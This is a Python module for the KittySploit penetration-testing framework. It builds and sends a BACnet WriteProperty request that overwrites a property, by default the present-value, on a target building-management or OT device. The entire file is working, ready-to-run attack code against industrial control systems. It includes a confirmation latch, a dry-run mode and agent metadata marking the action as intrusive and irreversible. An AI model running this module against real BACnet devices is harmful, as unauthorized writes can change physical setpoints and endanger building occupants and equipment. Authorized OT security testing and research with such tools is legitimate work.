#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.ics.bacnet_client import write_property
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.ics.ics_session_mixin import BacnetSessionMixin


class Module(Post, Ics_scanner_client, BacnetSessionMixin):
    __info__ = {
        "name": "BACnet write property",
        "description": (
            "Sends a BACnet WriteProperty request (intrusive — BMS/OT lab only). "
            "Gated by ot_policy destructive markers + confirm latch."
        ),
        "author": "KittySploit Team",
        "tags": ["ics", "bacnet", "bms", "write"],
        "session_type": [SessionType.BACNET, SessionType.SHELL],
        "platform": Platform.MULTI,
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.5,
            "value": 1.0,
            "requires": {"capabilities_any": ["ot_assets", "bacnet"]},
            "chain": {
                "produces_capabilities": [],
                "consumes_capabilities": ["bacnet"],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["bacnet"], "BACnet/IP UDP port", True)
    device_id = OptInteger(1, "BACnet device instance", True)
    object_type = OptInteger(2, "BACnet object type (e.g. 2=AV)", True)
    object_instance = OptInteger(1, "Object instance", True)
    property_id = OptInteger(85, "Property identifier (85=present-value)", True)
    value = OptInteger(0, "Integer value to write (encoded as application tagged unsigned)", True)
    dry_run = OptBool(False, "Build request only — do not send", False)
    confirm = OptBool(False, "Must be True to send (safety latch)", True)

    def check(self):
        if self._resolve_session():
            return True
        return bool(self._host())

    def run(self):
        payload = bytes([0x21, int(self.value) & 0xFF])
        if bool(self.dry_run):
            print_success(
                f"Dry run — would WriteProperty dev={self.device_id} "
                f"obj={self.object_type}:{self.object_instance} prop={self.property_id} "
                f"value={self.value}"
            )
            return True

        if not bool(self.confirm):
            print_error("Set confirm=true to send WriteProperty (authorized lab only)")
            return False

        print_warning("Sending BACnet WriteProperty — authorized lab use only")
        try:
            client = self.open_bacnet()
            did = int(self.device_id or 0) or int(client.device_id or 0)
            response = client.write_prop(
                int(self.object_type),
                int(self.object_instance),
                int(self.property_id),
                payload,
                device_id=did,
            )
        except Exception:
            host = self._host()
            if not host:
                print_error("BACnet session or target is required")
                return False
            response = write_property(
                host,
                int(self.device_id),
                int(self.object_type),
                int(self.object_instance),
                int(self.property_id),
                payload,
                self._port(),
                self._timeout(),
            )

        if response:
            print_success(f"WriteProperty response received ({len(response)} bytes)")
            return True
        print_error("No BACnet response")
        return False
